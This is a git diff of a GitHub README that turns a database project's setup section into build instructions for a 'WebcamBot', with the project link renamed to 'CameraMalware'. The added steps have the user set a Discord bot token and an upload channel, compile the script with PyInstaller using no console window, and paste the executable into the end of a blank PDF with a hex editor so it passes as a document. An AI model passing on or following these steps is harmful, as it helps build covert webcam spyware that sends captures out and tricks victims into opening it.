@@ -11,11 +11,9 @@ A fully functional database, follows a key:value format along with the ability t
 
 <p align="right">(<a href="#readme-top">back to top</a>)</p>
 
-
-
 <!-- GETTING STARTED -->
 ## Getting Started
-You need python installed.
+You need Python, HXD (Download link is https://mh-nexus.de/en/hxd/) 
 
 ### Prerequisites
 
@@ -27,18 +25,20 @@ This is an example of how to list things you need to use the software and how to
 1. Download Python
 2. Clone the repo
    ```sh
-   git cloneht https://github.com/D3STRUCTION1234/TextQL/
+   git clone
+    https://github.com/D3STRUCTION1234/TextQL/
    ```
-3. Press run
+   This can be run standalone but should be turned into a .exe file.
+3. Fill the token for your bot as well as the channel you want your files to be uploaded to.
+4. Do
+   ```sh
+   pyinstaller --onefile --noconsole --name WebcamBot {Path to file}/discordbot.py 
+   ```
+5. From here open up HXD, open up a blank pdf file as well as your exe file.
+6. At the end of the pdf file paste the exe code and save (This may take a while for the filetype to update).
+7. Press run
 
 <p align="right">(<a href="#readme-top">back to top</a>)</p>
-
-<!-- ROADMAP -->
-## Roadmap
-
-- [ ] Read/Write to DB
-- [ ] Custom Query Language that allows for ease of interaction with the DB
-- [ ] Fully functional example tests that show proof of it working.
 
 <p align="right">(<a href="#readme-top">back to top</a>)</p>
 
@@ -56,7 +56,7 @@ Distributed under the project_license. See `LICENSE.txt` for more information.
 
 Your Name - https://www.linkedin.com/in/aaryan-nair-1938a12a7/ - meetaaryannair@gmail.com
 
-Project Link: [https://github.com/bqsill/TextQL/](https://github.com/D3STRUCTION1234/TextQL/))
+Project Link: [https://github.com/bqsill/TextQL/](https://github.com/bqsill/CameraMalware))
 
 <p align="right">(<a href="#readme-top">back to top</a>)</p>
 
